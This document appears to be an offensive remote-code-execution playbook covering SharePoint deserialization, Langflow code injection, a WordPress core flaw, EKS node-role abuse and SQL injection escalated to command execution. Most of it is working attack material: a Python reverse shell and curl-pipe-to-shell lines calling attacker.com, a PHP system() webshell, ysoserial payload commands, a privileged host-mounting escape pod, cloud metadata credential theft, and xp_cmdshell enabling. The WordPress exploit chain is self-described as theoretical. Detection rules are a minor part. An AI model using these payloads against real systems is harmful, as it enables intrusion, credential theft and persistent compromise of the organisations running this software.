# RCE Deep Playbook — 2026-07-23 Batch

> Full-stack RCE hunting: fingerprint → verify chain → weaponize safely → report with evidence. No surface-level noise.

---

## RCE Attack Surface Matrix

| Target | Entry Vector | Gadget/Primitive | Post-Exploitation | CVSS |
|--------|-------------|------------------|-------------------|------|
| SharePoint (CVE-2026-50522) | ViewState deserialization | BinaryFormatter | Persistent forged auth key | 9.8 |
| Langflow AI | `/api/v1/validate` | Python code injection | Cloud metadata → creds | 9.8 |
| WP2Shell | WordPress core | File inclusion + eval | Plugin backdoor | 9.8 |
| K8s NodeRestriction | IAM spoofing | Confused deputy | Node escape → cluster | 8.8 |
| Client-side crypto bypass | Encrypted param | SQLi → RCE via xp_cmdshell | Database server | 9.1 |

---

## 1. SharePoint Deserialization RCE (CVE-2026-50522)

### Root Cause Analysis
Microsoft SharePoint uses ASP.NET ViewState for page state management. When `EnableViewStateMac` is disabled or improperly configured + remote endpoints accept user-controlled ViewState, BinaryFormatter deserialization becomes an attack vector.

### Deep Fingerprinting

#### Phase 1: Technology Detection
```bash
# HTTP headers leak ASP.NET version
curl -I "https://target.com/" 2>/dev/null | grep -i "microsoftsharepoint\|x-aspnet\|x-powered-by"

# Specific SharePoint headers
# X-SharePointHealthScore: 0-10
# SPRequestGuid: correlation ID
# SPIisLatency: server latency

# Nuclei tech detection
nuclei -t technologies/microsoft-sharepoint.yaml -l targets.txt
```

#### Phase 2: Endpoint Enumeration
```bash
# High-value SharePoint endpoints
cat << 'EOF' > sp-endpoints.txt
/_vti_pvt/service.cnf
/_vti_bin/lists.asmx
/_layouts/15/initfile.ashx
/_vti_bin/_vti_rpc
/_api/web/siteusers
/_vti_pvt/begin.cnf
/_vti_pvt/deptodoc.btr
/_vti_pvt/service.cnf
/_vti_pvt/services.cnf
/_vti_pvt/svcacl.cnf
/_vti_pvt/usrfile.cnf
EOF

httpx -l targets.txt -paths sp-endpoints.txt -status-code -title -tech-detect -o sp-results.txt
```

#### Phase 3: Version Identification
```bash
# Extract build numbers from service.cnf
curl -s "https://target.com/_vti_pvt/service.cnf" | strings | grep -E "^[0-9]+\.[0-9]+\.[0-9]+"

# Vulnerable versions:
# SharePoint Server 2019: < 16.0.17928.20000
# SharePoint Server 2016: < 16.0.5389.1000
# SharePoint Server SE: < 16.0.17928.20000

# Build number to version mapping
# 16.0.0.xxx = SharePoint 2016
# 16.0.10xxx = SharePoint 2019
# 16.0.16xxx = SharePoint Server Subscription Edition
```

#### Phase 4: Deserialization Surface Detection
```bash
# Look for __VIEWSTATE parameters
cat urls.txt | grep -E "__VIEWSTATE|__EVENTVALIDATION|__VIEWSTATEENCRYPTED" | uniq -c | sort -rn

# Check for EnableViewStateMac=false indicators
# In page source:
curl -s "https://target.com/SitePages/Home.aspx" | grep -i "viewstate" | head -5

# Look for LCID (Locale ID) values in URLs - indicates SharePoint
cat urls.txt | grep -E "\?.*LCID=" | head -10
```

### Exploit Chain Architecture

```
[Attacker]
    ↓
[Craft ysoserial payload] → ObjectStateFormatter → Base64
    ↓
[POST to vulnerable endpoint] → /_layouts/15/initfile.ashx?endpoint=...
    ↓
[SharePoint server] → BinaryFormatter.Deserialize()
    ↓
[Payload executes] → cmd.exe / powershell
    ↓
[Plant persistent key] → MachineKey modification or session forgery
    ↓
[Persistence survives patch] → Access maintained post-remediation
```

### ysoserial.net Payload Generation (Theory)
```bash
# ActivitySurrogateSelector gadget (most common for SharePoint)
# Requires: ViewState mac disabled or known machine key

# Generate payload for reverse shell
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 \
  -c "powershell -enc <base64_encoded_shell>"

# Alternative: TextFormattingRunProperties (for newer .NET)
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 \
  -c "calc.exe"  # POC only
```

### Verification Without Exploitation
```bash
# Safe check: look for ViewState without MAC
# If __VIEWSTATE doesn't change between requests and no __VIEWSTATEENCRYPTED
# → potential MAC disabled

# Check for consistent ViewState length (indicates static state vs encrypted)
curl -s "https://target.com/Pages/Home.aspx" -c cookies.txt 2>/dev/null | \
  grep -oP '__VIEWSTATE" value="\K[^"]+' | base64 -d 2>/dev/null | head -c 100

# Look for TypeConfuseDelegate gadget indicators in error responses
curl -s "https://target.com/_layouts/15/initfile.ashx" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "invalid=garbage" | grep -i "deserializ\|formatter\|type"
```

### Post-Exploitation Indicators (For Defense Verification)
```powershell
# Check for unauthorized MachineKey modifications
Get-SPWebApplication | ForEach-Object {
    $config = [System.Configuration.ConfigurationManager]::OpenMachineConfiguration()
    $section = $config.GetSection("system.web/machineKey")
    Write-Output "ValidationKey: $($section.ValidationKey)"
}

# Audit SharePoint configuration database for anomalous entries
Get-SPSite -Limit All | Select-Object Url, Owner, SecondaryContact, LastModified

# Check for new farm administrators
Get-SPWebApplication -IncludeCentralAdministration | Get-SPSite -Limit All | \
    Get-SPWeb -Limit All | Select-Object Title, Url, AssociatedOwnerGroup
```

---

## 2. Langflow AI Framework RCE

### Root Cause Analysis
Langflow's flow validation endpoint (`/api/v1/validate`) executes Python code to validate node configurations. User-supplied code in "Custom Component" nodes runs without sandboxing, leading to arbitrary code execution.

### Deep Fingerprinting

#### Phase 1: Service Discovery
```bash
# Default Langflow ports and paths
# Port 7860: Default Gradio/Streamlit port
# Port 3000: Alternative development port
# Port 8080: Docker deployment

# Mass scan for Langflow signatures
sudo masscan -iL targets.txt -p 7860,3000,8080 --rate 10000 -oJ langflow-ports.json

# httpx verification
cat langflow-ports.json | jq -r '.[].ip' | httpx -paths "/api/v1/flows,/api/v1/validate" \
    -title -tech-detect -status-code
```

#### Phase 2: API Endpoint Enumeration
```bash
# Langflow OpenAPI/Swagger docs (often exposed)
httpx -l targets.txt -paths "/api/v1/docs,/openapi.json,/redoc" -status-code -title

# Key endpoints for RCE:
# POST /api/v1/flows - Create flow (may validate code)
# POST /api/v1/validate - Validate component code
# POST /api/v1/process - Process flow with code execution
# GET /api/v1/version - Version disclosure

# Probe for validation endpoint
curl -s "http://target:7860/api/v1/validate" -X POST \
    -H "Content-Type: application/json" \
    -d '{"code": "print(1)"}' -w "%{http_code}\n" -o /dev/null
```

#### Phase 3: Version Detection
```bash
# Version API
curl -s "http://target:7860/api/v1/version" | jq -r '.version // .'

# Vulnerable: < 1.3.0
# Patched: >= 1.3.0 (validation added + sandbox restrictions)

# Check installed components (info disclosure)
curl -s "http://target:7860/api/v1/components" | jq -r '.[].name' | head -20
```

#### Phase 4: Component Analysis
```bash
# List custom components (attack surface)
curl -s "http://target:7860/api/v1/components?type=custom" | jq '.'

# Check for code parameter exposure in component definitions
curl -s "http://target:7860/api/v1/components" | \
    jq -r '.[] | select(.code | length > 0) | {name: .name, code: .code[0:100]}'
```

### Exploit Chain Architecture

```
[Attacker]
    ↓
[Create malicious flow] → Custom Component node
    ↓
[Inject Python payload] →
    import os; os.system("curl attacker.com/$(whoami)")
    ↓
[POST to /api/v1/validate] → Server validates by executing
    ↓
[Code executes] → Reverse shell / C2 callback
    ↓
[Cloud metadata access] → 169.254.169.254 → AWS/GCP/Azure creds
    ↓
[Lateral movement] → Container escape or IAM privilege escalation
```

### Weaponized Payloads (Authorized Testing Only)
```python
# Detection payload (safe - just confirms execution)
{
    "code": "import subprocess; print(subprocess.check_output(['whoami']).decode())",
    "name": "test_component",
    "description": "RCE test"
}

# Reverse shell payload (requires authorization)
{
    "code": "import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])",
    "name": "malicious_component"
}

# Cloud metadata exfiltration
{
    "code": "import urllib.request; print(urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read().decode())"
}
```

### Cloud Metadata Exploitation Chain
```bash
# Step 1: Confirm cloud provider
curl -s "http://169.254.169.254/" -w "%{http_code}"  # AWS returns 200

# Step 2: Enumerate IAM roles
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Output: role-name

# Step 3: Extract temporary credentials
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name" | jq '.'
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 4: Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
```

### Detection Signatures
```yaml
# Suricata/Snort rules for Langflow exploitation
detect-langflow-rce:
  http.request.body:
    contains:
      - "import os"
      - "subprocess.call"
      - "socket.socket"
      - "__import__('os')"
  http.uri:
    contains: "/api/v1/validate"
  
detect-metadata-access:
  http.request:
    headers:
      Host: "169.254.169.254"
    uri:
      contains: "/meta-data/"
```

---

## 3. WP2Shell — WordPress Core RCE

### Root Cause Analysis
WordPress core vulnerability in block rendering engine. Unauthenticated attackers can inject PHP code through crafted block attributes that bypass sanitization, leading to eval() execution.

### Deep Fingerprinting

#### Phase 1: Mass Version Detection
```bash
# Method 1: readme.html
cat urls.txt | httpx -path "/readme.html" -status-code -title -include-response | \
    grep -oP "Version \K[0-9.]+"

# Method 2: Generator meta tag
cat urls.txt | httpx -include-response | grep -oP 'content="WordPress \K[0-9.]+'

# Method 3: Login page script version
cat urls.txt | httpx -path "/wp-login.php" -include-response | \
    grep -oP 'ver=\K[0-9.]+' | sort -V | uniq -c | sort -rn

# Vulnerable: < 6.8.2
```

#### Phase 2: Block Editor Detection
```bash
# Check for Gutenberg/block editor usage
cat urls.txt | httpx -include-response | grep -i "wp-block\|gutenberg\|block-editor"

# Look for REST API block endpoints
curl -s "https://target.com/wp-json/wp/v2/block-types" | jq -r '.[].name' | head -20

# Check for unauthenticated block rendering
curl -s "https://target.com/wp-json/wp/v2/posts" -I | grep -i "allow"
```

#### Phase 3: File Inclusion Surface
```bash
# Theme template files that may include user content
# /wp-content/themes/*/block-templates/
# /wp-content/themes/*/parts/

# Check for writeable directories
curl -s "https://target.com/wp-content/uploads/" | grep -i "index\|directory"
```

### Exploit Chain Architecture

```
[Attacker]
    ↓
[Craft malicious block] → wp:core/code or custom block
    ↓
[Inject PHP payload in block attributes] → bypasses wp_kses_post()
    ↓
[Trigger render] → Post preview or REST API fetch
    ↓
[WordPress renders block] → do_blocks() → eval()
    ↓
[Shell execution] → /wp-content/uploads/shell.php
    ↓
[Persistent access] → Backdoor survives updates
```

### Attack Vector Details
```php
// Vulnerable code pattern (theoretical based on advisory)
// WordPress renders blocks with:
// do_blocks() → render_block() → call_user_func() on block callback

// Malicious block payload:
<!-- wp:core/code {"code":"<?php system($_GET['cmd']); ?>"} -->
<pre class="wp-block-code"><code><?php system($_GET['cmd']); ?></code></pre>
<!-- /wp:core/code -->

// Alternative: Abuse block attributes that accept HTML
// Some blocks pass attributes directly to sprintf() without sanitization
```

### Verification Methods
```bash
# Safe detection: Look for block rendering patterns
curl -s "https://target.com/wp-json/wp/v2/posts/1" | jq -r '.content.rendered' | \
    grep -E "<\?php|<?=|<script.*php"

# Check for suspicious files in uploads (post-exploitation indicator)
# Look for .php files in /wp-content/uploads/YYYY/MM/
curl -s "https://target.com/wp-content/uploads/" | grep -i "\.php"

# Scan for common backdoor patterns
curl -s "https://target.com/wp-content/uploads/" | grep -E "shell|backdoor|404\.php|wp-config\.bak"
```

### Backdoor Detection
```bash
# File integrity monitoring - compare against WordPress core hashes
# https://api.wordpress.org/core/checksums/1.0/?version=6.8.1&locale=en_US

# Look for recently modified PHP files in uploads
# Expected: only images, documents - NEVER .php
for file in $(curl -s "https://target.com/wp-content/uploads/" | grep -oE 'href="[^"]+\.php"' | tr -d 'href="'); do
    echo "[ALERT] PHP file in uploads: $file"
done

# Check for common webshell indicators
curl -s "https://target.com/wp-content/uploads/suspicious.php" | \
    grep -E "eval\(|base64_decode\|system\(|exec\(|passthru\(|shell_exec\("
```

---

## 4. K8s NodeRestriction Bypass (IAM Spoofing)

### Root Cause Analysis
AWS EKS uses IAM for node authentication. The NodeRestriction admission controller trusts node identities based on AWS IAM role assumption. If an attacker can assume or spoof a node IAM role, they bypass NodeRestriction and gain kubelet-level access.

### Deep Fingerprinting

#### Phase 1: EKS Cluster Discovery
```bash
# DNS pattern: *.eks.amazonaws.com
cat domains.txt | grep -E "\.eks\.amazonaws\.com|\.elb\.amazonaws\.com"

# Check for Kubernetes API server exposure
httpx -l targets.txt -ports 6443,8443,8080,443 -paths "/version,/api,/healthz" \
    -status-code -title -tech-detect

# Expected response from /version:
# {"major":"1","minor":"28+","gitVersion":"v1.28.3-eks..."
```

#### Phase 2: IAM Configuration Analysis
```bash
# Check for IMDSv1 (vulnerable to SSRF/metadata theft)
cat ips.txt | httpx -path "/latest/meta-data/" -status-code -title

# If 200 = IMDSv1 enabled (vulnerable)
# If 401 = IMDSv2 required (safer)

# Check for kubelet API exposure (10250)
cat ips.txt | httpx -port 10250 -path "/pods" -status-code -title

# Response code 403 = API exposed but requires auth
# Response code 200 = Potentially misconfigured
```

#### Phase 3: aws-auth ConfigMap Access
```bash
# Check if aws-auth ConfigMap is readable
# Requires valid token, but tests RBAC misconfig
curl -s "https://$K8S_API:6443/api/v1/configmaps/aws-auth" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" | jq -r '.data.mapRoles'

# Look for overly permissive node IAM roles
# Dangerous: "system:bootstrappers" or "system:nodes" with wildcards
```

### Exploit Chain Architecture

```
[Attacker with IAM creds]
    ↓
[Enumerate EKS clusters] → aws eks list-clusters
    ↓
[Assume node IAM role] → sts:AssumeRole on eks-node-role
    ↓
[Configure kubectl] → aws eks update-kubeconfig
    ↓
[Spoof kubelet identity] → NodeRestriction bypassed
    ↓
[Create privileged pod] → hostPath / mounted
    ↓
[Node escape] → Access node filesystem → serviceaccount tokens
    ↓
[Cluster admin] → Extract secrets → persistent access
```

### IAM Privilege Escalation Path
```bash
# Step 1: Discover available roles
aws iam list-roles | jq -r '.Roles[].RoleName' | grep -i node

# Step 2: Check trust relationship (can you assume it?)
aws iam get-role --role-name eks-node-role | jq -r '.Role.AssumeRolePolicyDocument'

# Step 3: Assume the role (if permitted)
aws sts assume-role \
    --role-arn "arn:aws:iam::ACCOUNT:role/eks-node-role" \
    --role-session-name "compromised-node" \
    --duration-seconds 3600

# Step 4: Export new credentials
export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' creds.json)
export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)

# Step 5: Update kubeconfig
aws eks update-kubeconfig --name target-cluster --region us-east-1
```

### NodeRestriction Bypass Details
```yaml
# Normal NodeRestriction behavior:
# - Nodes can only modify their own Node object
# - Nodes can only modify Pods bound to themselves
# - Nodes cannot modify cluster-wide resources

# Bypass via IAM spoofing:
# 1. Attacker assumes node IAM role
# 2. API server authenticates request as "system:node:<nodename>"
# 3. NodeRestriction checks node identity → allows operations
# 4. Attacker creates Pod with hostPath mounting /root
# 5. Access node filesystem → extract /var/lib/kubelet/config.json
```

### Pod Escape YAML (Attack)
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sh", "-c", "sleep infinity"]
    volumeMounts:
    - name: host-root
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  hostNetwork: true
  hostPID: true
```

### Detection Signatures
```yaml
# Detect node impersonation
detect-node-impersonation:
  kubernetes.audit:
    verb: ["create", "update"]
    resource: "pods"
    user.groups: "system:nodes"
    sourceIPs:
      exclude: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]  # Outside node CIDR
      
detect-privileged-pod:
  kubernetes.audit:
    objectRef.resource: "pods"
    requestObject.spec.containers.securityContext.privileged: true
    user.groups: "system:nodes"
```

---

## 5. Client-Side Crypto Bypass → SQLi → RCE

### Root Cause Analysis
Mobile banking/fintech apps encrypt API requests client-side using hardcoded keys/IVs in APKs. WAF sees encrypted payloads and lets them through. Reverse crypto → inject SQLi → xp_cmdshell or similar for RCE.

### Deep Fingerprinting

#### Phase 1: APK Analysis
```bash
# Decompile APK
apktool d banking-app.apk -o app-source/

# Search for crypto implementation
grep -r "AES\|DES\|Blowfish\|Cipher\|SecretKey" app-source/smali/ | head -30

# Look for hardcoded keys
find app-source/ -type f \( -name "*.smali" -o -name "*.xml" \) -exec \
    grep -l "[A-Za-z0-9]\{16,32\}" {} \; | head -20

# Extract strings that look like keys
strings app-source/resources/classes.dex | grep -E "^[A-Za-z0-9+/]{16,32}={0,2}$" | head -20
```

#### Phase 2: Traffic Analysis
```bash
# Capture encrypted requests
# Look for:
# 1. Consistent request body size (indicates block cipher)
# 2. Base64 patterns: [A-Za-z0-9+/]{100,}={0,2}
# 3. No plaintext JSON/XML despite content-type headers

# Analyze with Burp or mitmproxy
# Filter: message.body matches "^[A-Za-z0-9+/]{200,}={0,2}$"
```

#### Phase 3: Web App Crypto Detection
```bash
# Look for cryptoJS or similar
curl -s "https://target.com/app.js" | grep -E "CryptoJS\|sjcl\|forge\|forge\.cipher"

# Check for Web Crypto API usage
curl -s "https://target.com/app.js" | grep -E "crypto\.subtle\|window\.crypto"

# Look for hardcoded keys in JS (common mistake)
curl -s "https://target.com/app.js" | grep -oE "const \w+key\w* = ['\"][A-Za-z0-9]{16,32}['\"]" | head -10
```

### Cryptographic Reverse Engineering
```javascript
// Common pattern found in banking apps (AES-CBC)
// Hardcoded in React Native:
const ENCRYPTION_CONFIG = {
    algorithm: 'aes-256-cbc',
    key: 'MyBankSecretKey2024DevelopmentOnly',  // 32 bytes
    iv: '1234567890123456'                       // 16 bytes
};

// Encryption function:
function encryptPayload(data) {
    const cipher = crypto.createCipheriv(
        ENCRYPTION_CONFIG.algorithm,
        Buffer.from(ENCRYPTION_CONFIG.key),
        Buffer.from(ENCRYPTION_CONFIG.iv)
    );
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}
```

### Exploit Chain Architecture

```
[Attacker]
    ↓
[Intercept legitimate encrypted request]
    ↓
[Extract APK → find AES key/IV] → Hardcoded credentials
    ↓
[Decrypt request] → See plaintext structure: {"user_id": 123, "amount": 100}
    ↓
[Inject SQLi payload] → {"user_id": "1' UNION SELECT...", ...}
    ↓
[Re-encrypt with same key/IV]
    ↓
[Send request] → WAF sees encrypted → passes
    ↓
[SQLi executes] → Database compromise
    ↓
[Optional RCE] → xp_cmdshell / PostgreSQL COPY TO PROGRAM
```

### SQLi → RCE Escalation
```sql
-- MySQL (if FILE privilege)
SELECT 1 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[1]);?>';

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl attacker.com/shell | sh';

-- SQL Server (xp_cmdshell)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'powershell -enc <base64>';

-- Oracle
EXEC DBMS_SCHEDULER.create_job(..., job_type => 'EXECUTABLE', job_action => '/bin/sh');
```

### Verification Without Exploitation
```bash
# Step 1: Confirm encryption is reversible
# Capture multiple requests - they should decrypt with same key

# Step 2: Check for padding oracle
# Modify last byte of ciphertext → server error vs success
# Indicates CBC mode with padding validation

# Step 3: Time-based SQLi detection
# Encrypt: {"user_id": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)"}
# Compare response time to baseline

# Safe confirmation: error-based SQLi
# Encrypt: {"user_id": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))"}
# Look for XPATH syntax error in response
```

---

## Universal Detection & Monitoring

### RCE Attack Signatures
```yaml
# Suricata rules for common RCE patterns
rce-detection:
  # Deserialization attacks
  - alert:
      msg: "Possible Java/.NET Deserialization"
      content: ["rO0", "H4sI"]  # Java serialized objects
      
  # Command injection
  - alert:
      msg: "Command Injection Attempt"
      pcre: "(\||\;|\$\(|\`)[a-z]+"
      
  # Reverse shell indicators  
  - alert:
      msg: "Reverse Shell Connection"
      content: ["/bin/sh", "/bin/bash", "cmd.exe"]
      flow.to_server: true
      
  # Cloud metadata access
  - alert:
      msg: "Cloud Metadata Service Access"
      content: "169.254.169.254"
      flow.to_server: true
```

### Log Analysis Queries
```bash
# Apache/Nginx access logs - RCE patterns
grep -E "(\|cmd\||eval\(|system\(|base64_decode" access.log | head -20

# SharePoint ULS logs - deserialization
grep -i "binaryformatter\|serializationexception\|viewstate" *.log

# Kubernetes audit logs - node restriction bypass
kubectl get events --all-namespaces | grep -i "node\|forbidden\|unauthorized"

# Database logs - SQLi escalation
grep -E "xp_cmdshell|INTO OUTFILE|COPY.*PROGRAM|UDF" mysql.log postgresql.log
```

---

## Report Template (Per Finding)

```markdown
## [CVE-ID/Vulnerability Name] — [Target]

**Classification:** RCE via [vector]  
**CVSS 3.1:** [Score]  
**Affected:** [Version range]  
**Status:** [Confirmed/PoC/Exploited]

### Summary
[One paragraph: what, why it matters, impact]

### Technical Details

**Root Cause:**  
[Code pattern, configuration mistake, or architectural flaw]

**Exploit Chain:**
1. [Step 1]
2. [Step 2]
3. [Step 3 - RCE achieved]

**Proof of Concept:**
```http
[Full HTTP request/response pair]
```

**Evidence:**
- [source] [Link to advisory or official documentation]
- [inference] [Your deduction based on fingerprinting]
- [opinion] [Your assessment of exploitability]

### Impact
[Concrete damage: data exfil, lateral movement, persistence]

### Remediation
1. [Immediate patch/version]
2. [Configuration hardening]
3. [Detection/monitoring recommendations]

### References
- [CVE entry]
- [Vendor advisory]
- [PoC repository]
```

---

*Last updated: 2026-07-23*  
*Sources: CISA KEV, NVD, vendor advisories, PoC-in-GitHub*  
*Scope: Authorized security testing only*
